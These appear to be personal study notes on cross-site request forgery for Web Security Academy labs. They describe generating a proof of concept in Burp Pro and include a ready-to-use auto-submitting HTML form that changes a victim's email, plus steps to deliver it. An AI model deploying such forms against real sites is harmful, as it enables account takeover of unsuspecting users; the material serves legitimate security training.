# CSRF Notes

## Methodology

- In burp pro find a request that changes something you want for the user like a request to `update email`.
- right click the request and select `Engagement tools > Generate CSRF PoC`

Alternatively you can use a sample code like this without burp pro
- paste this code into your exploit server, and select `store`

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

- View the exploit to verify that it works, change the email address so that it doesn't match your own and select `deliver to victim`


## labs walkthrough

### CSRF vulnerability with no defenses
